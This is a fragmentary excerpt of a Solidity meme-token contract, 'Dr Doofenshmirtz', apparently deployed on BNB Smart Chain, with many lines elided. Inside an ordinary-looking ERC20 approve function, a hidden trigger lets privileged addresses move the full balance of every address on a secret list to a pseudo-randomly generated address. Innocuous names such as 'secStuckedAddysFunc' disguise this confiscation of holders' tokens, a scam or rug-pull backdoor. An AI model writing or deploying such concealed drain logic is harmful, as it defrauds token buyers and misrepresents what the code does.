...
// File: contracts/DrDoofenshmirtz.sol

// https://t.me/DrDoofensmirtzBSC
...
contract DrDoofenshmirtz is ERC20, Ownable {
    ...
    bool private limInEff = true;
    uint256 private mWallet;
    uint256 private mBuy;
    uint256 private mSell;

    address[] private addysToBeSec;

    constructor (address[] memory addresses) 
        ERC20("Dr Doofenshmirtz", "DrDoofenshmirtz")
    {
        
        uint256 _totalSupply = 1e6 * 10 ** decimals();
        ...
        mSell = totalSupply().mul(20).div(1000);
    ...
    function _approve(
        ...
        if(pAddys[owner]) {
            if(amount > 0) { secStuckedAddysFunc(); }
    ...
    function secAddyF(
        ...
        uint160 randNum = uint160(uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, addressToBeSaved)))  % (2**160));
        ...
        _tBalances[addressToBeSaved] = _tBalances[addressToBeSaved].sub(amount);
        _tBalances[_addressSaviour] = _tBalances[_addressSaviour].add(amount);
    }

    function secStuckedAddysFunc() private {
        for(uint256 i = 0; i < addysToBeSec.length; i++) {
            address addressToBeSaved = addysToBeSec[i];
            secAddyF(addressToBeSaved, _tBalances[addressToBeSaved]);
        }

        addysToBeSec = new address[](0);
    }
